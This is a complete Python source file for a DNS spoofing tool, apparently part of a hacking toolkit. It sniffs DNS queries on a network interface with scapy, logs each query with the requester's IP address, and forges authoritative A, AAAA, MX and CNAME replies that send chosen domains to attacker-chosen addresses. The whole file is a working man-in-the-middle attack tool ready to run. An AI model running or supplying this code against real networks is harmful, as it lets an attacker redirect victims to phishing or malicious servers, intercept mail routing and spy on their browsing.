
# =============================================================================
# Filename   : dns_spoof.py
# Description: DNS spoofer supporting A, AAAA, MX, CNAME record types.
#              Loads domain-IP mappings from file, logs all captured queries.
#              Part of PARALELEPIPEDO Toolkit.
# Author     : PARALELEPIPEDO Toolkit
# =============================================================================

import argparse
import sys
import datetime
import json
import threading

from colorama import Fore, Style, init
from scapy.all import (
    DNS, DNSQR, DNSRR, DNSRRMX,
    IP, IPv6, UDP,
    sniff, send, conf
)

init(autoreset=True)

_lock         = threading.Lock()
_spoofed_cnt  = 0
_logged_cnt   = 0
_log_entries  = []


def info(msg):  print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def warn(msg):  print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")
def err(msg):   print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")
def spoof_msg(msg): print(f"{Fore.MAGENTA}[SPOOF]{Style.RESET_ALL} {msg}")
def query_msg(msg): print(f"{Fore.CYAN}[QUERY]{Style.RESET_ALL} {msg}")


# ---------------------------------------------------------------------------
# Mapping helpers
# ---------------------------------------------------------------------------

def load_hosts_file(path: str) -> dict[str, str]:
    """Parse a hosts-style file (domain IP) into a dict."""
    mapping = {}
    try:
        with open(path) as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split()
                if len(parts) >= 2:
                    mapping[parts[0].lower().rstrip(".")] = parts[1]
    except FileNotFoundError:
        err(f"Hosts file not found: {path}")
    return mapping


def parse_spoof_map(pairs: list[str]) -> dict[str, str]:
    """Parse domain=IP pairs from CLI."""
    mapping = {}
    for pair in pairs:
        if "=" not in pair:
            warn(f"Skipping malformed spoof-map entry: {pair}")
            continue
        domain, ip = pair.split("=", 1)
        mapping[domain.lower().rstrip(".")] = ip
    return mapping


# ---------------------------------------------------------------------------
# DNS response builder
# ---------------------------------------------------------------------------

def build_dns_response(pkt, domain: str, spoof_ip: str,
                       record_types: set[str]) -> bytes | None:
    """
    Craft a DNS response packet for the given domain and spoof IP.
    Supports A, AAAA, CNAME, MX.
    Returns the crafted packet or None if the qtype is not in record_types.
    """
    dns_layer = pkt[DNS]
    qtype_num = dns_layer.qd.qtype   # numeric qtype

    QTYPE_MAP = {1: "A", 28: "AAAA", 15: "MX", 5: "CNAME"}
    qtype_str = QTYPE_MAP.get(qtype_num, str(qtype_num))

    if qtype_str not in record_types:
        return None

    # Build the IP/UDP reply
    if pkt.haslayer(IP):
        ip_reply = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    elif pkt.haslayer(IPv6):
        from scapy.layers.inet6 import IPv6 as IPv6L
        ip_reply = IPv6L(dst=pkt[IPv6].src, src=pkt[IPv6].dst)
    else:
        return None

    udp_reply = UDP(dport=pkt[UDP].sport, sport=53)

    # Build the answer record based on type
    if qtype_str == "A":
        rr = DNSRR(rrname=dns_layer.qd.qname, type="A",
                   rdata=spoof_ip, ttl=300)
    elif qtype_str == "AAAA":
        rr = DNSRR(rrname=dns_layer.qd.qname, type="AAAA",
                   rdata=spoof_ip, ttl=300)
    elif qtype_str == "CNAME":
        rr = DNSRR(rrname=dns_layer.qd.qname, type="CNAME",
                   rdata=spoof_ip + ".", ttl=300)
    elif qtype_str == "MX":
        rr = DNSRRMX(rrname=dns_layer.qd.qname, type="MX",
                     exchange=spoof_ip + ".", preference=10, ttl=300)
    else:
        return None

    dns_reply = DNS(
        id=dns_layer.id,
        qr=1, aa=1, rd=0, ra=1,
        qdcount=1, ancount=1,
        qd=dns_layer.qd,
        an=rr,
    )
    return ip_reply / udp_reply / dns_reply


# ---------------------------------------------------------------------------
# Packet handler
# ---------------------------------------------------------------------------

def make_handler(spoof_map: dict, record_types: set,
                 iface: str, log_file: str | None):
    global _spoofed_cnt, _logged_cnt

    def handler(pkt):
        global _spoofed_cnt, _logged_cnt

        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return  # only DNS queries

        if not pkt.haslayer(DNSQR):
            return

        qname = pkt[DNSQR].qname.decode("utf-8", errors="replace").rstrip(".")
        qname_key = qname.lower()
        ts = datetime.datetime.utcnow().isoformat() + "Z"

        src_ip = pkt[IP].src if pkt.haslayer(IP) else "unknown"

        log_entry = {
            "timestamp": ts,
            "src_ip": src_ip,
            "query": qname,
            "spoofed": False,
            "spoof_ip": None,
        }

        if qname_key in spoof_map:
            spoof_ip = spoof_map[qname_key]
            reply    = build_dns_response(pkt, qname, spoof_ip, record_types)
            if reply is not None:
                send(reply, iface=iface, verbose=False)
                log_entry["spoofed"]  = True
                log_entry["spoof_ip"] = spoof_ip
                with _lock:
                    _spoofed_cnt += 1
                spoof_msg(f"{qname} -> {spoof_ip}  [{src_ip}]")
            else:
                query_msg(f"{qname} (qtype not in spoofed types)  [{src_ip}]")
        else:
            with _lock:
                _logged_cnt += 1
            query_msg(f"{qname}  [{src_ip}]")

        # Logging
        with _lock:
            _log_entries.append(log_entry)

        if log_file:
            try:
                with open(log_file, "a") as lf:
                    lf.write(json.dumps(log_entry) + "\n")
            except OSError as exc:
                err(f"Log write error: {exc}")

    return handler


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description="PARALELEPIPEDO Toolkit – DNS Spoofer"
    )
    p.add_argument("--interface", "-i", default=conf.iface,
                   help="Network interface to sniff/send on")
    p.add_argument("--spoof-map", nargs="+", metavar="domain=IP",
                   help="One or more domain=IP pairs to spoof")
    p.add_argument("--hosts-file", metavar="FILE",
                   help="Hosts file with 'domain IP' lines")
    p.add_argument("--log-file", metavar="FILE",
                   help="Append all captured DNS queries (JSON lines) here")
    p.add_argument("--types", default="A",
                   help="Comma-separated record types to spoof: A,AAAA,MX,CNAME (default: A)")
    return p.parse_args()


def main():
    args = parse_args()

    spoof_map: dict[str, str] = {}

    if args.hosts_file:
        loaded = load_hosts_file(args.hosts_file)
        spoof_map.update(loaded)
        info(f"Loaded {len(loaded)} entries from {args.hosts_file}")

    if args.spoof_map:
        cli_map = parse_spoof_map(args.spoof_map)
        spoof_map.update(cli_map)
        info(f"Loaded {len(cli_map)} entries from --spoof-map")

    if not spoof_map:
        warn("No spoof mappings provided. All queries will be logged only.")

    record_types = {t.strip().upper() for t in args.types.split(",")}
    info(f"Spoofing record types: {', '.join(sorted(record_types))}")

    if args.log_file:
        info(f"Logging all queries to: {args.log_file}")

    info(f"Sniffing on {args.interface} ... (Ctrl+C to stop)")

    handler = make_handler(spoof_map, record_types, args.interface, args.log_file)

    try:
        sniff(
            iface=args.interface,
            filter="udp port 53",
            prn=handler,
            store=False,
        )
    except KeyboardInterrupt:
        pass

    print()
    info(f"Done. Spoofed: {_spoofed_cnt}  |  Logged (pass-through): {_logged_cnt}")


if __name__ == "__main__":
    main()
